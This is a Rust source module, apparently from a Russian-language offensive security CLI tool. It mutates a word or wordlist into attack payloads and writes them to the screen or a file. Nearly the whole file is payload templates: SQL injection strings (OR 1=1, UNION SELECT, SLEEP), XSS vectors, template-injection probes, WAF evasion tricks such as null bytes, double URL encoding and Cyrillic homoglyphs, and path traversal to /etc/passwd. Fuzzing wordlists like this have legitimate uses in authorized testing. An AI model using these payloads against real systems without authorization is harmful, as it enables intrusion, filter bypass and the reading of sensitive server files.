use anyhow::Result;
use crate::ui::{self, color::*};

pub async fn run() -> Result<()> {
    ui::section("dna mutation — мутация вордлиста");
    println!();

    let input   = ui::prompt("базовая строка или путь к файлу:");
    if input.is_empty() { ui::err("ввод обязателен"); return Ok(()); }

    let outfile = ui::prompt_default("сохранить в файл (enter — только экран):", "");

    let mode_s  = ui::prompt_default("режим мутации (1=sql 2=xss 3=bypass 4=path 5=все):", "5");
    let mode: u8 = mode_s.trim().parse().unwrap_or(5);

    // load words
    let words: Vec<String> = if std::path::Path::new(&input).exists() {
        std::fs::read_to_string(&input)
            .unwrap_or_default()
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| l.trim().to_string())
            .collect()
    } else {
        vec![input.clone()]
    };

    println!("  {GRAY}мутируем {} базовых строк...{RESET}", words.len());

    let mut mutations: Vec<String> = vec![];

    for word in &words {
        mutations.push(word.clone());

        if mode == 1 || mode == 5 {
            // SQL injection mutations
            mutations.push(format!("{word}'"));
            mutations.push(format!("{word}''"));
            mutations.push(format!("{word}\""));
            mutations.push(format!("{word}' OR '1'='1"));
            mutations.push(format!("{word}' OR 1=1--"));
            mutations.push(format!("{word}' OR 1=1#"));
            mutations.push(format!("{word}') OR ('1'='1"));
            mutations.push(format!("{word}' UNION SELECT NULL--"));
            mutations.push(format!("{word}' AND SLEEP(5)--"));
            mutations.push(format!("' {word} '"));
            mutations.push(format!("{word}%27"));            // url-encoded '
            mutations.push(format!("{word}%2527"));          // double url-encoded '
        }

        if mode == 2 || mode == 5 {
            // XSS mutations
            mutations.push(format!("{word}<script>alert(1)</script>"));
            mutations.push(format!("{word}\"><script>alert(1)</script>"));
            mutations.push(format!("{word}'><img src=x onerror=alert(1)>"));
            mutations.push(format!("{word}{{{{7*7}}}}"));    // SSTI
            mutations.push(format!("{word}${{7*7}}"));
            mutations.push(format!("{word}#{{7*7}}"));
            mutations.push(format!("{word}javascript:alert(1)"));
            mutations.push(format!("{word}<svg/onload=alert(1)>"));
            mutations.push(format!("{word}\" onmouseover=\"alert(1)"));
        }

        if mode == 3 || mode == 5 {
            // WAF bypass / filter evasion
            mutations.push(word.to_uppercase());
            mutations.push(word.to_lowercase());
            mutations.push(mixed_case(word));
            mutations.push(format!("{word}%00"));            // null byte
            mutations.push(format!("{word}%0a"));            // newline
            mutations.push(format!("{word}%09"));            // tab
            mutations.push(url_double_encode(word));
            mutations.push(html_encode_full(word));
            mutations.push(format!("{word}<!--"));
            mutations.push(format!("/*{word}*/"));
            mutations.push(format!("{word}//"));
            mutations.push(unicode_substitution(word));
        }

        if mode == 4 || mode == 5 {
            // Path traversal mutations
            mutations.push(format!("../{word}"));
            mutations.push(format!("../../{word}"));
            mutations.push(format!("../../../{word}"));
            mutations.push(format!("../../../../{word}"));
            mutations.push(format!("..%2F{word}"));
            mutations.push(format!("..%252F{word}"));
            mutations.push(format!("..%c0%af{word}"));       // UTF-8 overlong
            mutations.push(format!("..\\{word}"));
            mutations.push(format!("..\\\\{word}"));
            mutations.push(format!("{word}/../../../../etc/passwd"));
            mutations.push(format!("/etc/passwd%00.{word}"));
        }
    }

    mutations.dedup();

    ui::cursor_up(1);

    if !outfile.is_empty() {
        tokio::fs::write(&outfile, mutations.join("\n")).await?;
    }

    println!();
    println!("  {DRED}╔═══════════════ {BRED}{BOLD}dna mutation{RESET}{DRED} ═══════════════╗{RESET}");
    println!("  {DRED}║{RESET}  {GRAY}базовых строк:{RESET}  {WHITE}{}{RESET}", words.len());
    println!("  {DRED}║{RESET}  {GRAY}мутаций:{RESET}  {BRED}{BOLD}{}{RESET}", mutations.len());
    if !outfile.is_empty() {
        println!("  {DRED}║{RESET}  {BRED}✓{RESET}  сохранено в {WHITE}{outfile}{RESET}");
    }
    println!("  {DRED}║{RESET}");

    for (i, m) in mutations.iter().enumerate().take(40) {
        let display = if m.len() > 68 { format!("{}…", &m[..67]) } else { m.clone() };
        println!("  {DRED}║{RESET}  {GRAY}{:>4}{RESET}  {DRED}{display}{RESET}", i+1);
    }
    if mutations.len() > 40 {
        println!("  {DRED}║{RESET}  {GRAY}  … ещё {} мутаций{RESET}", mutations.len()-40);
    }

    println!("  {DRED}║{RESET}");
    println!("  {DRED}╚══════════════════════════════════════════════════════════════╝{RESET}");
    ui::divider();
    Ok(())
}

fn mixed_case(s: &str) -> String {
    s.chars().enumerate().map(|(i, c)| {
        if i % 2 == 0 { c.to_uppercase().next().unwrap_or(c) }
        else          { c.to_lowercase().next().unwrap_or(c) }
    }).collect()
}

fn url_double_encode(s: &str) -> String {
    s.chars().flat_map(|c| {
        if c.is_alphanumeric() { vec![c] }
        else { format!("%25{:02X}", c as u32).chars().collect() }
    }).collect()
}

fn html_encode_full(s: &str) -> String {
    s.chars().map(|c| format!("&#{};", c as u32)).collect()
}

fn unicode_substitution(s: &str) -> String {
    s.chars().map(|c| match c {
        'a' => 'а', // Cyrillic а
        'e' => 'е', // Cyrillic е
        'o' => 'о', // Cyrillic о
        'p' => 'р', // Cyrillic р
        'c' => 'с', // Cyrillic с
        'x' => 'х', // Cyrillic х
        c   => c,
    }).collect()
}
